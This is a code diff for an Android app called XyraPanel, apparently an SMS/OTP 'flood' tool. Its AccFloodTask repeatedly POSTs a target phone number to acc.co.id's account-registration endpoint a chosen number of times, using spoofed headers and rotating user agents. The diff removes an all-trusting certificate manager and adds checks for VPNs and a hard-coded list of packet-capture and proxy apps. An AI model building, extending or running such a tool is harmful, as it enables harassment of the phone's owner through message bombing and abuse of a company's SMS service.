@@ -14,14 +14,23 @@ import android.os.Build;
 import android.os.Bundle;
 import android.view.View;
 import android.view.Window;
+import android.view.LayoutInflater;
 import android.widget.Button;
 import android.widget.CheckBox;
 import android.widget.CompoundButton;
 import android.widget.EditText;
+import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 import android.app.Notification;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
+import android.net.Network;
+import android.net.NetworkCapabilities;
+import android.content.pm.PackageManager;
+import android.content.Context;
+
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
@@ -30,30 +39,14 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.OutputStream;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.io.BufferedReader;
-import java.net.URL;
 import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.NetworkInterface;
 import java.util.Random;
 import java.util.ArrayList;
 import java.util.Collections;
+import java.util.Enumeration;
 import java.util.List;
-import java.security.SecureRandom;
-import java.security.MessageDigest;
-import java.security.cert.Certificate;
-import java.security.cert.CertificateException;
-import java.security.cert.X509Certificate;
-import javax.net.ssl.SSLContext;
-import javax.net.ssl.SSLSocketFactory;
-import javax.net.ssl.TrustManager;
-import javax.net.ssl.X509TrustManager;
-import javax.net.ssl.HttpsURLConnection;
-import javax.net.ssl.HostnameVerifier;
-import javax.net.ssl.SSLSession;
-import javax.net.ssl.SSLPeerUnverifiedException;
-import android.util.Base64;
-import android.content.Context;
 
 public class MainActivity extends Activity {
 
@@ -66,6 +59,7 @@ public class MainActivity extends Activity {
     private TextView tvStatusTitle;
     private TextView tvStatSuccess, tvStatFailed, tvStatAvg;
     private View statusDot;
+    private View btnFailureInfo;
 
     private AccFloodTask currentTask;
     private boolean isRunning = false;
@@ -78,6 +72,22 @@ public class MainActivity extends Activity {
     private static final String ACTION_SHOW_HISTORY = "com.xyra.panel.SHOW_HISTORY";
     private static final int NOTIFICATION_ID = 1001;
     private Button btnHistory, btnAbout;
+    
+    private ArrayList<FailureInfo> failureList = new ArrayList<>();
+    
+    private static class FailureInfo {
+        String icon;
+        String title;
+        String description;
+        String time;
+        
+        FailureInfo(String icon, String title, String description) {
+            this.icon = icon;
+            this.title = title;
+            this.description = description;
+            this.time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date());
+        }
+    }
 
     private class AccFloodTask extends AsyncTask<String, Object, String> {
 
@@ -167,7 +177,7 @@ public class MainActivity extends Activity {
 
                 long startTime = System.currentTimeMillis();
 
-                HttpsURLConnection conn = null;
+                HttpURLConnection conn = null;
                 try {
                     JSONArray jsonArray = new JSONArray();
                     JSONObject payload = new JSONObject();
@@ -179,15 +189,9 @@ public class MainActivity extends Activity {
 
                     String jsonData = jsonArray.toString();
                     String userAgent = getUniqueUserAgent();
-                    String requestId = generateRequestId();
 
                     URL url = new URL(urlStr);
-                    conn = (HttpsURLConnection) url.openConnection();
-                    
-                    if (protectedSSLFactory != null) {
-                        conn.setSSLSocketFactory(protectedSSLFactory);
-                    }
-                    
+                    conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("POST");
                     conn.setConnectTimeout(15000);
                     conn.setReadTimeout(20000);
@@ -200,19 +204,11 @@ public class MainActivity extends Activity {
                     conn.setRequestProperty("Origin", "https://www.acc.co.id");
                     conn.setRequestProperty("Referer", "https://www.acc.co.id/register/new-account");
                     conn.setRequestProperty("sec-ch-ua-platform", "\"Android\"");
-                    conn.setRequestProperty("X-Request-ID", requestId);
-                    conn.setRequestProperty("X-Protected", "true");
 
                     OutputStream os = conn.getOutputStream();
                     os.write(jsonData.getBytes("UTF-8"));
                     os.flush();
                     os.close();
-
-                    conn.connect();
-                    
-                    if (!verifyCertificatePin(conn)) {
-                        throw new SSLPeerUnverifiedException("Certificate pin verification failed - possible SSL bypass detected");
-                    }
 
                     int responseCode = conn.getResponseCode();
                     long duration = System.currentTimeMillis() - startTime;
@@ -222,16 +218,29 @@ public class MainActivity extends Activity {
                         totalSuccesses++;
                     } else {
                         totalFailures++;
+                        publishProgress("FAILURE", "Server Error", "Response code: " + responseCode, i, totalKirim);
                     }
 
-                } catch (SSLPeerUnverifiedException e) {
+                } catch (java.net.SocketTimeoutException e) {
                     long duration = System.currentTimeMillis() - startTime;
                     totalDurationMs += duration;
                     totalFailures++;
+                    publishProgress("FAILURE", "Timeout", "Koneksi terlalu lama, jaringan lambat", i, totalKirim);
+                } catch (java.net.UnknownHostException e) {
+                    long duration = System.currentTimeMillis() - startTime;
+                    totalDurationMs += duration;
+                    totalFailures++;
+                    publishProgress("FAILURE", "Tidak Ada Jaringan", "Periksa koneksi internet Anda", i, totalKirim);
+                } catch (java.io.IOException e) {
+                    long duration = System.currentTimeMillis() - startTime;
+                    totalDurationMs += duration;
+                    totalFailures++;
+                    publishProgress("FAILURE", "Koneksi Gagal", e.getMessage(), i, totalKirim);
                 } catch (Exception e) {
                     long duration = System.currentTimeMillis() - startTime;
                     totalDurationMs += duration;
                     totalFailures++;
+                    publishProgress("FAILURE", "Error", e.getMessage(), i, totalKirim);
                 } finally {
                     if (conn != null) {
                         conn.disconnect();
@@ -240,7 +249,7 @@ public class MainActivity extends Activity {
 
                 int progress = (int) ((float) i / totalKirim * 100);
                 long avgTime = (i > 0) ? totalDurationMs / i : 0;
-                publishProgress(progress, totalSuccesses, totalFailures, avgTime, i, totalKirim);
+                publishProgress("PROGRESS", progress, totalSuccesses, totalFailures, avgTime, i, totalKirim);
 
                 if (i < totalKirim && !isCancelled()) {
                     try {
@@ -256,11 +265,18 @@ public class MainActivity extends Activity {
 
         @Override
         protected void onProgressUpdate(Object... values) {
-            progressBar.setProgress((Integer) values[0]);
-            tvStatSuccess.setText(String.valueOf((Integer) values[1]));
-            tvStatFailed.setText(String.valueOf((Integer) values[2]));
-            tvStatAvg.setText(String.valueOf((Long) values[3]));
-            tvStatusTitle.setText("Sending " + values[4] + "/" + values[5]);
+            String type = (String) values[0];
+            if ("PROGRESS".equals(type)) {
+                progressBar.setProgress((Integer) values[1]);
+                tvStatSuccess.setText(String.valueOf((Integer) values[2]));
+                tvStatFailed.setText(String.valueOf((Integer) values[3]));
+                tvStatAvg.setText(String.valueOf((Long) values[4]));
+                tvStatusTitle.setText("Sending " + values[5] + "/" + values[6]);
+            } else if ("FAILURE".equals(type)) {
+                String title = (String) values[1];
+                String desc = (String) values[2];
+                addFailureInfo("!", title, desc);
+            }
         }
 
         @Override
@@ -319,6 +335,7 @@ public class MainActivity extends Activity {
         tvStatFailed = findViewById(R.id.tv_stat_failed);
         tvStatAvg = findViewById(R.id.tv_stat_avg);
         statusDot = findViewById(R.id.status_dot);
+        btnFailureInfo = findViewById(R.id.btn_failure_info);
 
         btnQuick1.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -376,13 +393,18 @@ public class MainActivity extends Activity {
                 }
             }
         });
+        
+        btnFailureInfo.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                showFailureInfoDialog();
+            }
+        });
 
         btnHistory = findViewById(R.id.btn_history);
         btnAbout = findViewById(R.id.btn_about);
         tvAppTitle = findViewById(R.id.tv_app_title);
         tvAppTitle.setText("XyraPanel");
-
-        // Title dengan warna gradient static
         tvAppTitle.setTextColor(getResources().getColor(R.color.colorPrimary));
 
         btnHistory.setOnClickListener(new View.OnClickListener() {
@@ -401,92 +423,155 @@ public class MainActivity extends Activity {
 
         createNotificationChannel();
         checkPrivacyPolicy();
-        
         selectProvider("sms");
-        
         handleNotificationIntent(getIntent());
-        
-        initProtectedClient();
     }
     
-    private SSLSocketFactory protectedSSLFactory;
-    private static final String[] PINNED_HASHES = {
-        "jQJTbIh0grw0/1TkHSumWb+Fs0Ggogr621gT3PvPKG0=",
-        "C5+lpZ7tcVwmwQIMcRtPbsQtWLABXhQzejna0wHFr8M="
-    };
+    private void addFailureInfo(String icon, String title, String description) {
+        failureList.add(new FailureInfo(icon, title, description));
+        updateFailureIcon();
+    }
     
-    private void initProtectedClient() {
-        try {
-            TrustManager[] trustManagers = new TrustManager[]{
-                new X509TrustManager() {
-                    @Override
-                    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
-                    }
-                    
-                    @Override
-                    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
-                        if (chain == null || chain.length == 0) {
-                            throw new CertificateException("Certificate chain is empty");
-                        }
-                    }
-                    
-                    @Override
-                    public X509Certificate[] getAcceptedIssuers() {
-                        return new X509Certificate[0];
-                    }
-                }
-            };
-            
-            SSLContext sslContext = SSLContext.getInstance("TLS");
-            sslContext.init(null, trustManagers, new SecureRandom());
-            protectedSSLFactory = sslContext.getSocketFactory();
-            
-        } catch (Exception e) {
-            protectedSSLFactory = null;
+    private void updateFailureIcon() {
+        if (failureList.size() > 0) {
+            btnFailureInfo.setVisibility(View.VISIBLE);
+        } else {
+            btnFailureInfo.setVisibility(View.GONE);
         }
     }
     
-    private boolean verifyCertificatePin(HttpsURLConnection conn) {
+    private void showFailureInfoDialog() {
+        final Dialog dialog = new Dialog(this);
+        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
+        dialog.setContentView(R.layout.dialog_failure_info);
+        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        dialog.setCancelable(true);
+        
+        TextView tvFailureCount = dialog.findViewById(R.id.tv_failure_count);
+        LinearLayout layoutItems = dialog.findViewById(R.id.layout_failure_items);
+        Button btnClear = dialog.findViewById(R.id.btn_clear_failures);
+        Button btnClose = dialog.findViewById(R.id.btn_close_failures);
+        
+        tvFailureCount.setText(failureList.size() + " masalah terdeteksi");
+        
+        if (isVpnActive()) {
+            addFailureItemToLayout(layoutItems, "V", "VPN Terdeteksi", "VPN aktif dapat mengganggu koneksi");
+        }
+        
+        if (isPacketCaptureAppInstalled()) {
+            addFailureItemToLayout(layoutItems, "H", "HTTP Capture Terdeteksi", "Aplikasi capture HTTP/SSL terinstal");
+        }
+        
+        if (!isNetworkAvailable()) {
+            addFailureItemToLayout(layoutItems, "N", "Tidak Ada Jaringan", "Perangkat tidak terhubung ke internet");
+        }
+        
+        for (FailureInfo info : failureList) {
+            addFailureItemToLayout(layoutItems, info.icon, info.title, info.description + " (" + info.time + ")");
+        }
+        
+        btnClear.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                failureList.clear();
+                updateFailureIcon();
+                dialog.dismiss();
+                Toast.makeText(MainActivity.this, "Info kegagalan dihapus", Toast.LENGTH_SHORT).show();
+            }
+        });
+        
+        btnClose.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                dialog.dismiss();
+            }
+        });
+        
+        dialog.show();
+    }
+    
+    private void addFailureItemToLayout(LinearLayout parent, String icon, String title, String desc) {
+        View itemView = LayoutInflater.from(this).inflate(R.layout.item_failure_reason, parent, false);
+        
+        TextView tvIcon = itemView.findViewById(R.id.tv_failure_icon);
+        TextView tvTitle = itemView.findViewById(R.id.tv_failure_title);
+        TextView tvDesc = itemView.findViewById(R.id.tv_failure_desc);
+        
+        tvIcon.setText(icon);
+        tvTitle.setText(title);
+        tvDesc.setText(desc);
+        
+        parent.addView(itemView);
+    }
+    
+    private boolean isVpnActive() {
         try {
-            Certificate[] certs = conn.getServerCertificates();
-            if (certs == null || certs.length == 0) {
-                return false;
+            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
+            while (interfaces.hasMoreElements()) {
+                NetworkInterface iface = interfaces.nextElement();
+                String name = iface.getName().toLowerCase();
+                if ((name.contains("tun") || name.contains("ppp") || name.contains("pptp")) && iface.isUp()) {
+                    return true;
+                }
             }
             
-            for (Certificate cert : certs) {
-                String certHash = getCertificateHash(cert);
-                for (String pinnedHash : PINNED_HASHES) {
-                    if (pinnedHash.equals(certHash)) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+                Network activeNetwork = cm.getActiveNetwork();
+                if (activeNetwork != null) {
+                    NetworkCapabilities caps = cm.getNetworkCapabilities(activeNetwork);
+                    if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                         return true;
                     }
                 }
             }
-            return false;
         } catch (Exception e) {
-            return false;
+            e.printStackTrace();
         }
+        return false;
     }
     
-    private String getCertificateHash(Certificate cert) {
-        try {
-            MessageDigest md = MessageDigest.getInstance("SHA-256");
-            byte[] publicKeyBytes = cert.getPublicKey().getEncoded();
-            byte[] hash = md.digest(publicKeyBytes);
-            return Base64.encodeToString(hash, Base64.NO_WRAP);
-        } catch (Exception e) {
-            return "";
+    private boolean isPacketCaptureAppInstalled() {
+        String[] captureApps = {
+            "app.greyshirts.sslcapture",
+            "com.guyshefer.sslcaptureandroidexpert",
+            "com.egorovandreyrm.pcapremote",
+            "com.minhui.networkcapture",
+            "jp.co.taosoftware.android.packetcapture",
+            "com.emanuelef.remote_capture",
+            "eu.faircode.netguard",
+            "tech.httptoolkit.android.v1",
+            "com.reqable.android",
+            "com.charlesproxy.charles",
+            "org.proxydroid",
+            "org.sandroproxy.drony",
+            "com.mightydeveloper.httpcatcher"
+        };
+        
+        PackageManager pm = getPackageManager();
+        for (String packageName : captureApps) {
+            try {
+                pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
+                return true;
+            } catch (PackageManager.NameNotFoundException e) {
+            }
         }
+        return false;
     }
     
-    private String generateRequestId() {
-        SecureRandom random = new SecureRandom();
-        byte[] bytes = new byte[16];
-        random.nextBytes(bytes);
-        StringBuilder sb = new StringBuilder();
-        for (byte b : bytes) {
-            sb.append(String.format("%02x", b));
+    private boolean isNetworkAvailable() {
+        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        if (cm == null) return false;
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Network network = cm.getActiveNetwork();
+            if (network == null) return false;
+            NetworkCapabilities caps = cm.getNetworkCapabilities(network);
+            return caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
+        } else {
+            NetworkInfo networkInfo = cm.getActiveNetworkInfo();
+            return networkInfo != null && networkInfo.isConnected();
         }
-        return sb.toString();
     }
     
     @Override
@@ -551,6 +636,20 @@ public class MainActivity extends Activity {
             if (targetPhone.isEmpty() || jumlahStr.isEmpty()) {
                 Toast.makeText(this, "Isi semua kolom!", Toast.LENGTH_SHORT).show();
                 return;
+            }
+            
+            if (!isNetworkAvailable()) {
+                addFailureInfo("N", "Tidak Ada Jaringan", "Tidak dapat mengirim tanpa koneksi internet");
+                Toast.makeText(this, "Tidak ada koneksi internet!", Toast.LENGTH_SHORT).show();
+                return;
+            }
+            
+            if (isVpnActive()) {
+                addFailureInfo("V", "VPN Aktif", "VPN terdeteksi aktif saat pengiriman");
+            }
+            
+            if (isPacketCaptureAppInstalled()) {
+                addFailureInfo("H", "HTTP Capture", "Aplikasi capture terdeteksi terinstal");
             }
 
             int jumlahKirim = Integer.parseInt(jumlahStr);
@@ -623,53 +722,85 @@ public class MainActivity extends Activity {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
-                "Xyra Panel Notifications",
+                "Xyra Notifications",
                 NotificationManager.IMPORTANCE_DEFAULT
             );
-            channel.setDescription("Notifikasi pengiriman OTP");
+            channel.setDescription("Notifikasi pengiriman");
             NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(channel);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
         }
     }
 
     private void showNotification(String title, String message) {
-        NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        
-        Intent intent = new Intent(this, MainActivity.class);
-        intent.setAction(ACTION_SHOW_HISTORY);
-        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-        
-        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            flags |= PendingIntent.FLAG_IMMUTABLE;
+        try {
+            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            
+            Intent intent = new Intent(this, MainActivity.class);
+            intent.setAction(ACTION_SHOW_HISTORY);
+            intent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
+            
+            PendingIntent pendingIntent;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            } else {
+                pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
+            }
+            
+            Notification.Builder builder;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                builder = new Notification.Builder(this, CHANNEL_ID);
+            } else {
+                builder = new Notification.Builder(this);
+            }
+            
+            builder.setSmallIcon(android.R.drawable.ic_dialog_info)
+                   .setContentTitle(title)
+                   .setContentText(message)
+                   .setContentIntent(pendingIntent)
+                   .setAutoCancel(true);
+            
+            if (manager != null) {
+                manager.notify(NOTIFICATION_ID, builder.build());
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
-        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, flags);
-        
-        Notification.Builder builder;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            builder = new Notification.Builder(this, CHANNEL_ID);
-        } else {
-            builder = new Notification.Builder(this);
-        }
-        builder.setSmallIcon(R.drawable.ic_launcher)
-            .setContentTitle(title)
-            .setContentText(message)
-            .setContentIntent(pendingIntent)
-            .setAutoCancel(true);
-        manager.notify(NOTIFICATION_ID, builder.build());
     }
 
     private void saveHistory(String phone, int success, int failed, String provider) {
-        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-        String history = prefs.getString(KEY_HISTORY, "");
-        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
-        String timestamp = sdf.format(new Date());
-        String entry = timestamp + " | " + phone + " | " + provider.toUpperCase() + " | Berhasil: " + success + ", Gagal: " + failed + "\n";
-        history = entry + history;
-        if (history.length() > 5000) {
-            history = history.substring(0, 5000);
+        try {
+            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+            String history = prefs.getString(KEY_HISTORY, "");
+            
+            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM HH:mm", Locale.getDefault());
+            String timestamp = sdf.format(new Date());
+            
+            String newEntry = timestamp + "|" + phone + "|" + success + "|" + failed + "|" + provider.toUpperCase();
+            
+            if (!history.isEmpty()) {
+                history = newEntry + "\n" + history;
+            } else {
+                history = newEntry;
+            }
+            
+            String[] lines = history.split("\n");
+            if (lines.length > 20) {
+                StringBuilder sb = new StringBuilder();
+                for (int i = 0; i < 20; i++) {
+                    sb.append(lines[i]);
+                    if (i < 19) sb.append("\n");
+                }
+                history = sb.toString();
+            }
+            
+            SharedPreferences.Editor editor = prefs.edit();
+            editor.putString(KEY_HISTORY, history);
+            editor.apply();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
-        prefs.edit().putString(KEY_HISTORY, history).apply();
     }
 
     private void showHistoryDialog() {
@@ -677,34 +808,39 @@ public class MainActivity extends Activity {
         dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
         dialog.setContentView(R.layout.dialog_history);
         dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        dialog.setCancelable(true);
 
-        final TextView tvContent = dialog.findViewById(R.id.tv_history_content);
-        final TextView tvTotalEntries = dialog.findViewById(R.id.tv_total_entries);
-        final TextView tvTotalSuccess = dialog.findViewById(R.id.tv_total_success);
-        final TextView tvTotalFailed = dialog.findViewById(R.id.tv_total_failed);
+        final TextView tvHistory = dialog.findViewById(R.id.tv_history_content);
         Button btnClear = dialog.findViewById(R.id.btn_clear_history);
         Button btnClose = dialog.findViewById(R.id.btn_close_history);
 
-        final SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
         String history = prefs.getString(KEY_HISTORY, "");
-        
-        updateHistoryStats(history, tvTotalEntries, tvTotalSuccess, tvTotalFailed);
-        
+
         if (history.isEmpty()) {
-            tvContent.setText("Belum ada riwayat pengiriman");
+            tvHistory.setText("Belum ada riwayat pengiriman");
         } else {
-            String formattedHistory = formatHistoryDisplay(history);
-            tvContent.setText(formattedHistory);
+            StringBuilder formatted = new StringBuilder();
+            String[] lines = history.split("\n");
+            for (String line : lines) {
+                String[] parts = line.split("\\|");
+                if (parts.length >= 5) {
+                    formatted.append(parts[0]).append("\n");
+                    formatted.append("  ").append(parts[1]).append(" (").append(parts[4]).append(")\n");
+                    formatted.append("  Berhasil: ").append(parts[2]).append(" | Gagal: ").append(parts[3]).append("\n\n");
+                }
+            }
+            tvHistory.setText(formatted.toString().trim());
         }
 
         btnClear.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                prefs.edit().putString(KEY_HISTORY, "").apply();
-                tvContent.setText("Belum ada riwayat pengiriman");
-                tvTotalEntries.setText("0");
-                tvTotalSuccess.setText("0");
-                tvTotalFailed.setText("0");
+                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+                SharedPreferences.Editor editor = prefs.edit();
+                editor.remove(KEY_HISTORY);
+                editor.apply();
+                tvHistory.setText("Riwayat telah dihapus");
                 Toast.makeText(MainActivity.this, "Riwayat dihapus", Toast.LENGTH_SHORT).show();
             }
         });
@@ -718,64 +854,13 @@ public class MainActivity extends Activity {
 
         dialog.show();
     }
-    
-    private void updateHistoryStats(String history, TextView tvEntries, TextView tvSuccess, TextView tvFailed) {
-        if (history.isEmpty()) {
-            tvEntries.setText("0");
-            tvSuccess.setText("0");
-            tvFailed.setText("0");
-            return;
-        }
-        
-        String[] lines = history.split("\n");
-        int totalEntries = 0;
-        int totalSuccess = 0;
-        int totalFailed = 0;
-        
-        for (String line : lines) {
-            if (line.trim().isEmpty()) continue;
-            totalEntries++;
-            
-            try {
-                if (line.contains("Berhasil:")) {
-                    int startSuccess = line.indexOf("Berhasil:") + 9;
-                    int endSuccess = line.indexOf(",", startSuccess);
-                    if (endSuccess > startSuccess) {
-                        String successStr = line.substring(startSuccess, endSuccess).trim();
-                        totalSuccess += Integer.parseInt(successStr);
-                    }
-                }
-                if (line.contains("Gagal:")) {
-                    int startFailed = line.indexOf("Gagal:") + 6;
-                    String failedStr = line.substring(startFailed).trim();
-                    totalFailed += Integer.parseInt(failedStr);
-                }
-            } catch (Exception e) {
-            }
-        }
-        
-        tvEntries.setText(String.valueOf(totalEntries));
-        tvSuccess.setText(String.valueOf(totalSuccess));
-        tvFailed.setText(String.valueOf(totalFailed));
-    }
-    
-    private String formatHistoryDisplay(String history) {
-        String[] lines = history.split("\n");
-        StringBuilder formatted = new StringBuilder();
-        
-        for (String line : lines) {
-            if (line.trim().isEmpty()) continue;
-            formatted.append("> ").append(line).append("\n\n");
-        }
-        
-        return formatted.toString().trim();
-    }
 
     private void showAboutDialog() {
         final Dialog dialog = new Dialog(this);
         dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
         dialog.setContentView(R.layout.dialog_about);
         dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        dialog.setCancelable(true);
 
         Button btnClose = dialog.findViewById(R.id.btn_close_about);
         btnClose.setOnClickListener(new View.OnClickListener() {
@@ -786,10 +871,5 @@ public class MainActivity extends Activity {
         });
 
         dialog.show();
-    }
-
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
     }
 }
